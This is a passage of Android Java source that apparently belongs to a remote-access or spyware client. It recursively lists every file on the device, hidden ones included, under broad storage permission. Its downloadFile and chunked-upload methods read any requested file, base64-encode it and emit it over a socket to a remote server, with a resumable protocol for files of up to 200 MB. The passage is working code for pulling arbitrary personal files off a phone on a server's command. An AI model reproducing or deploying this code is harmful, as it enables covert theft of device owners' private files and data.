                            } catch (Exception e) {
                                // If comparison fails, just compare by path
                                return f1.getAbsolutePath().compareTo(f2.getAbsolutePath());
                            }
                        }
                    });
                } catch (Exception e) {
                    Log.w(TAG, "Error sorting files, using unsorted list: " + e.getMessage());
                    // Continue with unsorted files
                }
                
                // Process EVERY file returned by directory.list() - NO FILTERING
                Log.d(TAG, "🔄 Processing " + files.length + " files - ALL file types will be included");
                int processedCount = 0;
                int skippedCount = 0;
                
                for (java.io.File file : files) {
                    // Include ALL files - NO FILTERING by type, extension, or any other criteria
                    String fileName = null;
                    String filePath = null;
                    
                    try {
                        fileName = file.getName();
                        filePath = file.getAbsolutePath();
                    } catch (Exception e) {
                        Log.w(TAG, "Error getting file name/path: " + e.getMessage());
                        // Try to get path from parent
                        try {
                            filePath = directory.getAbsolutePath() + "/" + "unknown";
                            fileName = "unknown";
                        } catch (Exception e2) {
                            Log.e(TAG, "Cannot get file path at all, skipping file");
                            skippedCount++;
                            continue; // Skip this file if we can't even get its name
                        }
                    }
                    
                    // CRITICAL: Process this file regardless of type, extension, or any other property
                    // We will add it to the list even if we can't read all its properties
                    
                    // Include all files, including hidden ones
                    try {
                        // Try to access the file - don't skip based on canRead()
                        // With MANAGE_EXTERNAL_STORAGE permission, we can access all files
                        
                        // Get file info - handle errors gracefully
                        long fileSize = 0;
                        long lastModified = 0;
                        boolean isDirectory = false;
                        String extension = "";
                        String fileType = "Unknown";
                        
                        try {
                            isDirectory = file.isDirectory();
                            if (!isDirectory) {
                                try {
                                    fileSize = file.length();
                                } catch (Exception e) {
                                    Log.w(TAG, "Cannot get file size for: " + fileName);
                                }
                            }
                            try {
                                lastModified = file.lastModified();
                            } catch (Exception e) {
                                Log.w(TAG, "Cannot get last modified for: " + fileName);
                            }
                        } catch (Exception e) {
                            Log.w(TAG, "Error getting file info for: " + fileName + " - " + e.getMessage());
                            // Continue anyway - might still be accessible
                        }
                        
                        // Get file extension and type - handle all files, including those without extensions
                        if (fileName != null) {
                            try {
                                extension = getFileExtension(fileName);
                                fileType = getFileType(extension);
                                // If no extension found, still set a default type
                                if (extension.isEmpty() && !isDirectory) {
                                    fileType = "File"; // Default type for files without extension
                                }
                            } catch (Exception e) {
                                Log.w(TAG, "Error getting file extension/type for: " + fileName);
                                // Set defaults if extension detection fails
                                extension = "";
                                fileType = isDirectory ? "Folder" : "File";
                            }
                        } else {
                            // File name is null, set defaults
                            extension = "";
                            fileType = isDirectory ? "Folder" : "File";
                        }
                        
                            JSONObject fileObj = new JSONObject();
                        fileObj.put("name", fileName != null ? fileName : "Unknown");
                        fileObj.put("path", filePath != null ? filePath : "Unknown");
                        fileObj.put("isDir", isDirectory);
                        fileObj.put("isDirectory", isDirectory);
                        fileObj.put("size", fileSize);
                        fileObj.put("sizeFormatted", formatFileSize(fileSize));
                        fileObj.put("extension", extension);
                        fileObj.put("type", fileType);
                            
                            // Format last modified date
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                        if (lastModified > 0) {
                            fileObj.put("lastModified", sdf.format(new java.util.Date(lastModified)));
                            fileObj.put("timestamp", lastModified);
                        } else {
                            fileObj.put("lastModified", "");
                            fileObj.put("timestamp", 0);
                        }
                        
                        // Add emoji based on file type
                        try {
                            String emoji = getFileEmoji(fileName, isDirectory, extension);
                            fileObj.put("displayName", emoji + " " + (fileName != null ? fileName : "Unknown"));
                        } catch (Exception e) {
                            fileObj.put("displayName", "📄 " + (fileName != null ? fileName : "Unknown"));
                        }
                        
                        // Mark hidden files
                        if (fileName != null && fileName.startsWith(".")) {
                            fileObj.put("isHidden", true);
                        }
                        
                        // Mark if file might not be readable (for user info)
                        try {
                            if (!isDirectory) {
                                boolean canRead = file.canRead();
                                fileObj.put("readable", canRead);
                            } else {
                                fileObj.put("readable", true);
                            }
                        } catch (Exception e) {
                            fileObj.put("readable", true); // Assume readable if we can't check
                        }
                        
                        filesList.put(fileObj);
                        processedCount++;
                        // Log with emoji to make it easy to spot in logs - shows ALL file types
                        String logEmoji = isDirectory ? "📁" : 
                                         (extension.equals("apk") ? "📱" : 
                                         (extension.equals("zip") || extension.equals("rar") || extension.equals("7z") ? "📦" : 
                                         (extension.equals("pdf") ? "📄" : 
                                         (extension.equals("jpg") || extension.equals("jpeg") || extension.equals("png") || extension.equals("gif") ? "🖼️" : 
                                         (extension.equals("mp4") || extension.equals("avi") ? "🎥" : 
                                         (extension.equals("mp3") || extension.equals("wav") ? "🎵" : "📄"))))));
                        Log.d(TAG, logEmoji + " [" + processedCount + "/" + files.length + "] Added: " + fileName + " | Type: " + fileType + " | Ext: " + extension + " | Size: " + fileSize);
                    } catch (Exception e) {
                        Log.w(TAG, "Error processing file: " + fileName + " - " + e.getMessage());
                        // Still try to add basic file info even if there's an error
                        try {
                            JSONObject fileObj = new JSONObject();
                            fileObj.put("name", fileName != null ? fileName : "Unknown");
                            fileObj.put("path", filePath != null ? filePath : "Unknown");
                            try {
                                fileObj.put("isDir", file.isDirectory());
                                fileObj.put("isDirectory", file.isDirectory());
                            } catch (Exception e3) {
                                fileObj.put("isDir", false);
                                fileObj.put("isDirectory", false);
                            }
                            fileObj.put("size", 0);
                            fileObj.put("sizeFormatted", "0 B");
                            fileObj.put("type", "Unknown");
                            fileObj.put("extension", "");
                            fileObj.put("displayName", "❓ " + (fileName != null ? fileName : "Unknown"));
                            fileObj.put("readable", false);
                            fileObj.put("error", "Could not read file info: " + e.getMessage());
                            filesList.put(fileObj);
                            Log.d(TAG, "Added file with minimal info: " + fileName + " (error occurred during processing)");
                        } catch (Exception e2) {
                            Log.e(TAG, "Failed to add file even with minimal info: " + fileName);
                        }
                    }
                }
                
                // Log final processing summary - shows ALL files were processed
                Log.d(TAG, "✅✅✅ Processing complete: " + processedCount + " files added, " + skippedCount + " skipped (out of " + files.length + " total files)");
                if (skippedCount > 0) {
                    Log.w(TAG, "⚠️ Warning: " + skippedCount + " files were skipped due to errors");
                }
            } else {
                // No files found - try directory.list() as last resort
                Log.w(TAG, "No files found from primary methods for: " + directory.getAbsolutePath());
                // Try to get file count for debugging
                try {
                    String[] names = directory.list();
                    if (names != null && names.length > 0) {
                        Log.d(TAG, "directory.list() returned " + names.length + " file names as fallback");
                        // Create File objects from names and process them normally
                        files = new java.io.File[names.length];
                        for (int i = 0; i < names.length; i++) {
                            files[i] = new java.io.File(directory, names[i]);
                        }
                        Log.d(TAG, "Created " + files.length + " File objects from list() fallback, processing normally...");
                        // Re-process with the normal file processing loop (will happen after this else block)
                        // But we need to break out and reprocess, so let's set a flag and reprocess
                        // Actually, we can just continue to the normal processing by setting files and letting it fall through
                        // But since we're in an else block, we need to reprocess. Let's add the files directly here.
                        for (java.io.File file : files) {
                            String fileName = file.getName();
                            try {
                                boolean isDirectory = file.isDirectory();
                                long fileSize = isDirectory ? 0 : file.length();
                                String extension = getFileExtension(fileName);
                                String fileType = getFileType(extension);
                                if (extension.isEmpty() && !isDirectory) {
                                    fileType = "File";
                                }
                                
                                JSONObject fileObj = new JSONObject();
                                fileObj.put("name", fileName != null ? fileName : "Unknown");
                                fileObj.put("path", file.getAbsolutePath());
                                fileObj.put("isDir", isDirectory);
                                fileObj.put("isDirectory", isDirectory);
                                fileObj.put("size", fileSize);
                                fileObj.put("sizeFormatted", formatFileSize(fileSize));
                            fileObj.put("extension", extension);
                                fileObj.put("type", fileType);
                                
                                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                                long lastModified = file.lastModified();
                                if (lastModified > 0) {
                                    fileObj.put("lastModified", sdf.format(new java.util.Date(lastModified)));
                                    fileObj.put("timestamp", lastModified);
                                } else {
                                    fileObj.put("lastModified", "");
                                    fileObj.put("timestamp", 0);
                                }
                                
                                String emoji = getFileEmoji(fileName, isDirectory, extension);
                                fileObj.put("displayName", emoji + " " + (fileName != null ? fileName : "Unknown"));
                                
                                if (fileName != null && fileName.startsWith(".")) {
                                    fileObj.put("isHidden", true);
                                }
                                
                                fileObj.put("readable", file.canRead());
                            filesList.put(fileObj);
                                Log.d(TAG, "Added fallback file: " + fileName + " (type: " + fileType + ", extension: " + extension + ")");
                        } catch (Exception e) {
                                Log.e(TAG, "Error processing fallback file: " + (file != null ? file.getName() : "null") + " - " + e.getMessage());
                        }
                    }
                    } else {
                        Log.w(TAG, "directory.list() also returned " + (names == null ? "null" : "empty") + " - directory may be empty or inaccessible");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error calling directory.list() in fallback: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error walking directory: " + directory.getAbsolutePath() + " - " + e.getMessage());
        }
        
        Log.d(TAG, "walkDirectory completed: " + filesList.length() + " files listed from " + directory.getAbsolutePath());
        return filesList;
    }
    
    /**
     * Walk directory with pagination support - for large directories like Camera
     * Returns only a slice of files (offset to offset+limit)
     * This prevents timeouts and improves performance for folders with thousands of files
     */
    private JSONObject walkDirectoryPaginated(java.io.File directory, int offset, int limit) {
        JSONObject result = new JSONObject();
        JSONArray filesList = new JSONArray();
        int totalCount = 0;
        
        try {
            if (directory == null || !directory.exists() || !directory.isDirectory()) {
                result.put("files", filesList);
                result.put("total", 0);
                return result;
            }
            
            Log.d(TAG, "📄 Paginated walk: " + directory.getAbsolutePath() + " (offset: " + offset + ", limit: " + limit + ")");
            
            // Get ALL file names first (fast operation)
            String[] fileNames = directory.list();
            
            if (fileNames == null || fileNames.length == 0) {
                Log.d(TAG, "No files found in directory");
                result.put("files", filesList);
                result.put("total", 0);
                return result;
            }
            
            // Create File objects for sorting
            java.io.File[] files = new java.io.File[fileNames.length];
            for (int i = 0; i < fileNames.length; i++) {
                files[i] = new java.io.File(directory, fileNames[i]);
            }
            
            // Sort files: directories first, then files, both alphabetically
            try {
                java.util.Arrays.sort(files, new java.util.Comparator<java.io.File>() {
                    @Override
                    public int compare(java.io.File f1, java.io.File f2) {
                        try {
                            boolean f1IsDir = f1.isDirectory();
                            boolean f2IsDir = f2.isDirectory();
                            if (f1IsDir && !f2IsDir) return -1;
                            if (!f1IsDir && f2IsDir) return 1;
                            String name1 = f1.getName() != null ? f1.getName().toLowerCase() : "";
                            String name2 = f2.getName() != null ? f2.getName().toLowerCase() : "";
                            return name1.compareTo(name2);
                        } catch (Exception e) {
                            return f1.getAbsolutePath().compareTo(f2.getAbsolutePath());
                        }
                    }
                });
            } catch (Exception e) {
                Log.w(TAG, "Error sorting files: " + e.getMessage());
            }
            
            // Add parent directory entry (always show, don't count in offset)
            if (directory.getParent() != null) {
                try {
                    JSONObject parent = new JSONObject();
                    parent.put("name", "../");
                    parent.put("path", directory.getParent());
                    parent.put("isDir", true);
                    parent.put("isDirectory", true);
                    parent.put("size", 0);
                    parent.put("sizeFormatted", "0 B");
                    parent.put("type", "Parent");
                    parent.put("lastModified", "");
                    parent.put("displayName", "📁 ../");
                    filesList.put(parent);
                } catch (Exception e) {
                    Log.w(TAG, "Error adding parent entry: " + e.getMessage());
                }
            }
            
            totalCount = files.length; // Total files (excluding parent)
            
            // Calculate pagination range
            int startIndex = Math.min(offset, files.length);
            int endIndex = Math.min(offset + limit, files.length);
            
            Log.d(TAG, "📊 Total files: " + totalCount + ", Processing range: " + startIndex + " to " + endIndex);
            
            // Process only the requested slice
            for (int i = startIndex; i < endIndex; i++) {
                java.io.File file = files[i];
                
                try {
                    String fileName = file.getName();
                    String filePath = file.getAbsolutePath();
                    long fileSize = 0;
                    long lastModified = 0;
                    boolean isDirectory = false;
                    String extension = "";
                    String fileType = "Unknown";
                    
                    try {
                        isDirectory = file.isDirectory();
                        if (!isDirectory) {
                            fileSize = file.length();
                        }
                        lastModified = file.lastModified();
                    } catch (Exception e) {
                        Log.w(TAG, "Cannot get file info for: " + fileName);
                    }
                    
                    if (fileName != null) {
                        try {
                            extension = getFileExtension(fileName);
                            fileType = getFileType(extension);
                            if (extension.isEmpty() && !isDirectory) {
                                fileType = "File";
                            }
                        } catch (Exception e) {
                            extension = "";
                            fileType = isDirectory ? "Folder" : "File";
                        }
                    } else {
                        extension = "";
                        fileType = isDirectory ? "Folder" : "File";
                    }
                    
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", fileName != null ? fileName : "Unknown");
                    fileObj.put("path", filePath != null ? filePath : "Unknown");
                    fileObj.put("isDir", isDirectory);
                    fileObj.put("isDirectory", isDirectory);
                    fileObj.put("size", fileSize);
                    fileObj.put("sizeFormatted", formatFileSize(fileSize));
                    fileObj.put("extension", extension);
                    fileObj.put("type", fileType);
                    
                    // Format last modified date
                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                    if (lastModified > 0) {
                        fileObj.put("lastModified", sdf.format(new java.util.Date(lastModified)));
                        fileObj.put("timestamp", lastModified);
                    } else {
                        fileObj.put("lastModified", "");
                        fileObj.put("timestamp", 0);
                    }
                    
                    // Add emoji
                    try {
                        String emoji = getFileEmoji(fileName, isDirectory, extension);
                        fileObj.put("displayName", emoji + " " + (fileName != null ? fileName : "Unknown"));
                    } catch (Exception e) {
                        fileObj.put("displayName", "📄 " + (fileName != null ? fileName : "Unknown"));
                    }
                    
                    // Mark hidden files
                    if (fileName != null && fileName.startsWith(".")) {
                        fileObj.put("isHidden", true);
                    }
                    
                    // Mark readability
                    try {
                        boolean canRead = file.canRead();
                        fileObj.put("readable", canRead);
                    } catch (Exception e) {
                        fileObj.put("readable", true);
                    }
                    
                    filesList.put(fileObj);
                    
                    if ((i - startIndex) % 20 == 0) {
                        Log.d(TAG, "✓ Processed " + (i - startIndex + 1) + "/" + (endIndex - startIndex) + " files");
                    }
                    
                } catch (Exception e) {
                    Log.w(TAG, "Error processing file at index " + i + ": " + e.getMessage());
                }
            }
            
            Log.d(TAG, "✅ Paginated walk complete: returned " + (filesList.length() - 1) + " files out of " + totalCount + " total");
            
            result.put("files", filesList);
            result.put("total", totalCount);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in paginated walk: " + e.getMessage());
            try {
                result.put("files", filesList);
                result.put("total", 0);
            } catch (Exception ex) {
                // Ignore
            }
        }
        
        return result;
    }
    
    /**
     * OPTIMIZED STREAMING VERSION for very large directories (6000+ files)
     * Only loads file names into memory, then processes requested batch
     * This prevents socket timeouts and memory issues
     */
    private JSONObject walkDirectoryStreamingPaginated(java.io.File directory, int offset, int limit) {
        JSONObject result = new JSONObject();
        JSONArray filesList = new JSONArray();
        int totalCount = 0;
        
        try {
            Log.d(TAG, "🚀 STREAMING PAGINATION: " + directory.getAbsolutePath());
            Log.d(TAG, "   Batch request: offset=" + offset + ", limit=" + limit);
            
            long startTime = System.currentTimeMillis();
            
            // STEP 1: Get file names only (lightweight, no File objects yet)
            String[] fileNames = directory.list();
            
            if (fileNames == null || fileNames.length == 0) {
                Log.w(TAG, "Directory is empty or cannot be read: " + directory.getAbsolutePath());
                result.put("files", filesList);
                result.put("total", 0);
                return result;
            }
            
            totalCount = fileNames.length;
            long countTime = System.currentTimeMillis() - startTime;
            Log.d(TAG, "📊 Total files: " + totalCount + " (counted in " + countTime + "ms)");
            
            // STEP 2: Add parent directory entry (only for offset 0)
            if (offset == 0 && directory.getParent() != null) {
                try {
                    JSONObject parent = new JSONObject();
                    parent.put("name", "../");
                    parent.put("path", directory.getParent());
                    parent.put("isDir", true);
                    parent.put("isDirectory", true);
                    parent.put("size", 0);
                    parent.put("sizeFormatted", "0 B");
                    parent.put("type", "Parent");
                    parent.put("lastModified", "");
                    parent.put("displayName", "📁 ../");
                    filesList.put(parent);
                } catch (Exception e) {
                    Log.w(TAG, "Error adding parent entry: " + e.getMessage());
                }
            }
            
            // STEP 3: Calculate pagination range
            int startIndex = Math.min(offset, fileNames.length);
            int endIndex = Math.min(offset + limit, fileNames.length);
            int batchSize = endIndex - startIndex;
            
            Log.d(TAG, "📦 Processing batch [" + startIndex + " to " + endIndex + "] = " + batchSize + " files");
            Log.d(TAG, "   Progress: " + String.format("%.1f%%", (offset * 100.0 / totalCount)));
            
            // STEP 4: Process ONLY the requested batch (create File objects on demand)
            long processStart = System.currentTimeMillis();
            int processed = 0;
            
            for (int i = startIndex; i < endIndex; i++) {
                try {
                    // Create File object ONLY for this batch item
                    java.io.File file = new java.io.File(directory, fileNames[i]);
                    
                    String fileName = file.getName();
                    String filePath = file.getAbsolutePath();
                    long fileSize = 0;
                    long lastModified = 0;
                    boolean isDirectory = false;
                    String extension = "";
                    String fileType = "Unknown";
                    
                    try {
                        isDirectory = file.isDirectory();
                        if (!isDirectory) {
                            fileSize = file.length();
                        }
                        lastModified = file.lastModified();
                    } catch (Exception e) {
                        Log.w(TAG, "Cannot get file info for: " + fileName);
                    }
                    
                    if (fileName != null) {
                        try {
                            extension = getFileExtension(fileName);
                            fileType = getFileType(extension);
                            if (extension.isEmpty() && !isDirectory) {
                                fileType = "File";
                            }
                        } catch (Exception e) {
                            extension = "";
                            fileType = isDirectory ? "Folder" : "File";
                        }
                    } else {
                        extension = "";
                        fileType = isDirectory ? "Folder" : "File";
                    }
                    
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", fileName != null ? fileName : "Unknown");
                    fileObj.put("path", filePath != null ? filePath : "Unknown");
                    fileObj.put("isDir", isDirectory);
                    fileObj.put("isDirectory", isDirectory);
                    fileObj.put("size", fileSize);
                    fileObj.put("sizeFormatted", formatFileSize(fileSize));
                    fileObj.put("extension", extension);
                    fileObj.put("type", fileType);
                    
                    // Format last modified date
                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                    if (lastModified > 0) {
                        fileObj.put("lastModified", sdf.format(new java.util.Date(lastModified)));
                        fileObj.put("timestamp", lastModified);
                    } else {
                        fileObj.put("lastModified", "");
                        fileObj.put("timestamp", 0);
                    }
                    
                    // Add emoji
                    try {
                        String emoji = getFileEmoji(fileName, isDirectory, extension);
                        fileObj.put("displayName", emoji + " " + (fileName != null ? fileName : "Unknown"));
                    } catch (Exception e) {
                        fileObj.put("displayName", "📄 " + (fileName != null ? fileName : "Unknown"));
                    }
                    
                    // Mark hidden files
                    if (fileName != null && fileName.startsWith(".")) {
                        fileObj.put("isHidden", true);
                    }
                    
                    // Mark readability
                    try {
                        boolean canRead = file.canRead();
                        fileObj.put("readable", canRead);
                    } catch (Exception e) {
                        fileObj.put("readable", true);
                    }
                    
                    filesList.put(fileObj);
                    processed++;
                    
                    // Progress logging every 100 files
                    if (processed % 100 == 0) {
                        long elapsed = System.currentTimeMillis() - processStart;
                        double filesPerSec = processed * 1000.0 / elapsed;
                        Log.d(TAG, "   ✓ " + processed + "/" + batchSize + 
                              " (" + String.format("%.0f", filesPerSec) + " files/sec)");
                    }
                    
                } catch (Exception e) {
                    Log.w(TAG, "Error processing file at index " + i + ": " + e.getMessage());
                }
            }
            
            long totalTime = System.currentTimeMillis() - startTime;
            int actualFiles = filesList.length() - (offset == 0 && directory.getParent() != null ? 1 : 0);
            
            Log.d(TAG, "✅ Streaming batch complete!");
            Log.d(TAG, "   Processed: " + actualFiles + " files in " + totalTime + "ms");
            if (totalTime > 0) {
                Log.d(TAG, "   Speed: " + String.format("%.1f", actualFiles * 1000.0 / totalTime) + " files/sec");
            }
            Log.d(TAG, "   Total progress: " + (offset + actualFiles) + "/" + totalCount + 
                  " (" + String.format("%.1f%%", ((offset + actualFiles) * 100.0 / totalCount)) + ")");
            
            result.put("files", filesList);
            result.put("total", totalCount);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in streaming paginated walk: " + e.getMessage());
            e.printStackTrace();
            try {
                result.put("files", filesList);
                result.put("total", 0);
            } catch (Exception ex) {
                // Ignore
            }
        }
        
        return result;
    }
    
    private JSONArray listFilesRecursively(java.io.File directory, String storageType, int depth, int maxFiles) {
        JSONArray filesList = new JSONArray();
        
        if (depth > 3 || maxFiles <= 0) { // Limit depth to 3 levels and max files
            return filesList;
        }
        
        try {
            if (directory != null && directory.exists() && directory.isDirectory()) {
                java.io.File[] files = directory.listFiles();
                if (files != null) {
                    for (java.io.File file : files) {
                        if (maxFiles <= 0) break;
                        
                        try {
                            JSONObject fileInfo = new JSONObject();
                            fileInfo.put("name", file.getName());
                            fileInfo.put("path", file.getAbsolutePath());
                            fileInfo.put("relativePath", file.getAbsolutePath().replace(directory.getAbsolutePath(), ""));
                            fileInfo.put("isDirectory", file.isDirectory());
                            fileInfo.put("size", file.length());
                            fileInfo.put("sizeFormatted", formatFileSize(file.length()));
                            fileInfo.put("storageType", storageType);
                            fileInfo.put("depth", depth);
                            
                            // Format last modified date
                            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
                            fileInfo.put("lastModified", sdf.format(new java.util.Date(file.lastModified())));
                            fileInfo.put("timestamp", file.lastModified());
                            
                            // Get file extension
                            String extension = "";
                            if (file.isFile() && file.getName().contains(".")) {
                                extension = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                            }
                            fileInfo.put("extension", extension);
                            fileInfo.put("type", getFileType(extension));
                            
                            filesList.put(fileInfo);
                            maxFiles--;
                            
                            // If it's a directory and we have space, add some subdirectory files
                            if (file.isDirectory() && maxFiles > 0) {
                                JSONArray subFiles = listFilesRecursively(file, storageType, depth + 1, Math.min(5, maxFiles));
                                for (int i = 0; i < subFiles.length(); i++) {
                                    filesList.put(subFiles.get(i));
                                    maxFiles--;
                                }
                            }
                            
                        } catch (Exception e) {
                            Log.w(TAG, "Error processing file: " + file.getName() + " - " + e.getMessage());
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "Error listing directory: " + directory.getAbsolutePath() + " - " + e.getMessage());
        }
        
        return filesList;
    }
    
    private String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        
        String[] units = {"B", "KB", "MB", "GB", "TB"};
        int unitIndex = 0;
        double fileSize = size;
        
        while (fileSize >= 1024 && unitIndex < units.length - 1) {
            fileSize /= 1024;
            unitIndex++;
        }
        
        return String.format(java.util.Locale.US, "%.1f %s", fileSize, units[unitIndex]);
    }
    
    private String getFileType(String extension) {
        if (extension == null || extension.isEmpty()) return "Unknown";
        
        switch (extension.toLowerCase()) {
            case "jpg":
            case "jpeg":
            case "png":
            case "gif":
            case "bmp":
            case "webp":
                return "Image";
            case "mp4":
            case "avi":
            case "mkv":
            case "mov":
            case "wmv":
            case "flv":
                return "Video";
            case "mp3":
            case "wav":
            case "aac":
            case "flac":
            case "ogg":
            case "3gp":
                return "Audio";
            case "pdf":
                return "PDF";
            case "doc":
            case "docx":
                return "Document";
            case "txt":
            case "log":
                return "Text";
            case "zip":
            case "rar":
            case "7z":
                return "Archive";
            case "apk":
                return "Application";
            default:
                return "File";
        }
    }
    
    private void downloadFile(String filePath) {
        java.io.FileInputStream fis = null;
        try {
            Log.d(TAG, "📥 Starting file download: " + filePath);
            
            java.io.File file = new java.io.File(filePath);
            if (!file.exists()) {
                sendErrorResponse("file_download", "File not found: " + filePath);
                return;
            }
            
            if (file.isDirectory()) {
                sendErrorResponse("file_download", "Cannot download directory: " + filePath);
                return;
            }
            
            // Check if file is readable
            if (!file.canRead()) {
                Log.w(TAG, "File may not be readable, attempting anyway: " + filePath);
            }
            
            long fileSize = file.length();
            if (fileSize <= 0) {
                sendErrorResponse("file_download", "File is empty or cannot determine size: " + filePath);
                return;
            }
            
            if (fileSize > 200 * 1024 * 1024) { // 200MB limit
                sendErrorResponse("file_download", "File too large: " + formatFileSize(fileSize) + " (max 200MB)");
                return;
            }
            
            // CHUNKED DOWNLOAD: Send large files in chunks to prevent timeout
            // Dynamic chunk size based on file size for optimal transfer speed
            int CHUNK_SIZE;
            if (fileSize > 500 * 1024 * 1024) { // > 500MB: Use 4MB chunks
                CHUNK_SIZE = 4 * 1024 * 1024;
            } else if (fileSize > 100 * 1024 * 1024) { // > 100MB: Use 2MB chunks
                CHUNK_SIZE = 2 * 1024 * 1024;
            } else if (fileSize > 10 * 1024 * 1024) { // > 10MB: Use 1MB chunks
                CHUNK_SIZE = 1024 * 1024;
            } else { // Smaller files: 512KB chunks
                CHUNK_SIZE = 512 * 1024;
            }
            
            if (fileSize > 2 * 1024 * 1024) { // Files > 2MB use chunked transfer
                Log.d(TAG, "📦 Large file detected (" + formatFileSize(fileSize) + "), using high-speed chunked transfer");
                Log.d(TAG, "   Chunk size: " + formatFileSize(CHUNK_SIZE));
                downloadFileChunked(file, filePath, fileSize, CHUNK_SIZE);
                return;
            }
            
            // SMALL FILES: Send in one piece (< 2MB)
            Log.d(TAG, "📄 Small file (" + formatFileSize(fileSize) + "), sending in one piece");
            
            fis = new java.io.FileInputStream(file);
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            byte[] buffer = new byte[8192];
            int bytesRead;
            long totalBytesRead = 0;
            
            while ((bytesRead = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, bytesRead);
                totalBytesRead += bytesRead;
                
                if (totalBytesRead > fileSize) {
                    Log.w(TAG, "Read more bytes than expected file size");
                    break;
                }
            }
            
            fis.close();
            fis = null;
            
            byte[] fileBytes = baos.toByteArray();
            baos.close();
            
            if (fileBytes.length == 0) {
                sendErrorResponse("file_download", "File is empty or could not be read: " + filePath);
                return;
            }
            
            Log.d(TAG, "✓ File read: " + fileBytes.length + " bytes");
            
            // Convert to Base64
            String base64File = android.util.Base64.encodeToString(fileBytes, android.util.Base64.NO_WRAP);
            fileBytes = null;
            System.gc();
            
            // Send file data
            JSONObject fileData = new JSONObject();
            fileData.put("type", "download");
            fileData.put("fileName", file.getName());
            fileData.put("filePath", filePath);
            fileData.put("fileSize", fileSize);
            fileData.put("fileSizeFormatted", formatFileSize(fileSize));
            fileData.put("fileExtension", getFileExtension(file.getName()));
            fileData.put("fileType", getFileType(getFileExtension(file.getName())));
            fileData.put("buffer", base64File);
            fileData.put("status", "File downloaded successfully");
            fileData.put("chunked", false);
            
            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US);
            fileData.put("lastModified", sdf.format(new java.util.Date(file.lastModified())));
            
            socket.emit(Constants.MESSAGE_FILES, fileData);
            Log.d(TAG, "✅ File sent: " + file.getName() + " (" + formatFileSize(fileSize) + ")");
            
        } catch (java.io.FileNotFoundException e) {
            Log.e(TAG, "File not found: " + filePath);
            sendErrorResponse("file_download", "File not found or access denied: " + e.getMessage());
        } catch (java.io.IOException e) {
            Log.e(TAG, "IO error reading file: " + filePath + " - " + e.getMessage());
            sendErrorResponse("file_download", "IO error: " + e.getMessage());
        } catch (OutOfMemoryError e) {
            Log.e(TAG, "Out of memory error reading file: " + filePath);
            sendErrorResponse("file_download", "File too large for memory: " + formatFileSize(new java.io.File(filePath).length()));
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception accessing file: " + filePath + " - " + e.getMessage());
            sendErrorResponse("file_download", "Access denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error downloading file: " + filePath + " - " + e.getMessage());
            sendErrorResponse("file_download", "Download failed: " + e.getMessage());
        } finally {
            // Ensure file stream is closed
            if (fis != null) {
                try {
                    fis.close();
                } catch (Exception e) {
                    Log.w(TAG, "Error closing file stream: " + e.getMessage());
                }
            }
        }
    }
    
    /**
     * Download large files using the RESUMABLE upload protocol.
     *
     * Protocol:
     *   1. Client sends "upload_init" with file metadata + unique fileId.
     *   2. Server responds with "upload_ready" → resumeFromChunk.
     *   3. Client sends each chunk via "upload_chunk", then waits for "upload_ack".
     *   4. On disconnect, the upload is paused. On reconnect, client sends "upload_resume".
     *   5. Server tells client which chunk to continue from. Client resumes seamlessly.
     *   6. Server sends "upload_complete" when all chunks are received and saved.
     *
     * This method is memory-efficient: only one chunk is in RAM at a time.
     * Duplicate chunks are safely ignored by the server (idempotent).
     *
     * @param file      The file to upload
     * @param filePath  Full path on the device
     * @param fileSize  File size in bytes
     * @param chunkSize Chunk size in bytes
     */
    private void downloadFileChunked(java.io.File file, String filePath, long fileSize, int chunkSize) {
        try {
            Log.d(TAG, "🚀 Starting RESUMABLE upload: " + file.getName());
            Log.d(TAG, "   File size : " + formatFileSize(fileSize));
            Log.d(TAG, "   Chunk size: " + formatFileSize(chunkSize));

            int totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
            Log.d(TAG, "   Total chunks: " + totalChunks);

            // Generate a deterministic fileId from path + size + lastModified
            // so that the same file always maps to the same upload session.
            String fileIdSource = filePath + "|" + fileSize + "|" + file.lastModified();
            String fileId = java.util.UUID.nameUUIDFromBytes(fileIdSource.getBytes()).toString();
            Log.d(TAG, "   fileId: " + fileId);

            // Create and register the upload task
            ResumableUploadTask task = new ResumableUploadTask(
                    fileId, filePath, file.getName(), fileSize, totalChunks, chunkSize);
            activeUploads.put(fileId, task);

            // Send upload_init to the server
            JSONObject initData = new JSONObject();
            initData.put("fileId", fileId);
            initData.put("fileName", file.getName());
            initData.put("filePath", filePath);
            initData.put("fileSize", fileSize);
            initData.put("totalChunks", totalChunks);
            initData.put("chunkSize", chunkSize);
            initData.put("fileExtension", getFileExtension(file.getName()));
            initData.put("fileType", getFileType(getFileExtension(file.getName())));
            socket.emit("upload_init", initData);

            // Small wait for upload_ready response — but we proceed with chunk 0 anyway
            // (the upload_ready listener will adjust nextChunkToSend if it's a resume)
            Thread.sleep(200);

            // Start sending chunks on a background thread
            resumeUploadTask(task);

        } catch (Exception e) {
            Log.e(TAG, "Error starting resumable upload: " + e.getMessage());
            e.printStackTrace();
            sendErrorResponse("file_download", "Resumable upload failed: " + e.getMessage());
        }
    }

    /**
